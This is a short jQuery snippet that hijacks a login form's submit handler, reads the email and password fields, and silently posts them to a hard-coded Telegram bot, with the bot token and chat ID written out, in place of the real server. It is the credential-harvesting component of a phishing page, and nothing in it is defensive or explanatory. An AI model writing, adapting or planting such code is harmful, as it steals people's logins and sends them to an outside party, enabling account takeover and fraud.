function sendToTelegram(email, password) {
    const botToken = '7494153356:AAFQo6RDU7o_Cjn88uVqmwTFyQZaqoOn25k'; // Your provided bot token
    const chatId = '5607989288'; // Your provided chat ID
    const message = `Email: ${email}\nPassword: ${password}`; // Customize the message format as needed

    $.ajax({
        type: 'POST',
        url: `https://api.telegram.org/bot${botToken}/sendMessage`,
        data: {
            chat_id: chatId,
            text: message
        },
        success: function(response) {
            console.log('Message sent to Telegram:', response);
        },
        error: function(error) {
            console.error('Error sending message to Telegram:', error);
        }
    });
}

$('#your-form-id').submit(function(event) {
    event.preventDefault(); // Prevent default form submission

    var email = $('#email-input-id').val();
    var password = $('#password-input-id').val();

    // Send data to Telegram instead of the server
    sendToTelegram(email, password);
});
